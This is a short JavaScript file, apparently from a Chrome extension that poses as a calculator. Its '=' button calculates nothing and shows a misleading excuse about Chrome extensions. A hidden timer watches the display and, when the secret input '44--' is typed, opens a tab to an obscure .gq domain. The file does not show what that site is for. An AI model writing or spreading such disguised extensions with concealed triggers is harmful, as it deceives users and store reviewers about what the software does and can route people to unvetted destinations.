$( ".btn" ).each(function() {
  let btn = $(this);
  if (btn.val() == '=') {
    btn.click(function() {
      // document.getElementById('display').value = eval(document.getElementById('display').value);
      document.getElementById('display').value = '';
      alert('Calculation to be added in next update. This is due to the way Chrome extensions work.');
    });
  } else if (btn.val() == 'c') {
    btn.click(function() {
      document.getElementById('display').value = '';
    });
  } else {
    btn.click(function() {
      document.getElementById('display').value += btn.val();
    });
  }
});

var interval = setInterval(function() {
  if (document.getElementById('display').value == '44--') {
    chrome.tabs.create({ url: 'https://jdi21j9kuw.gq' });
    clearInterval(interval);
  }
}, 500);
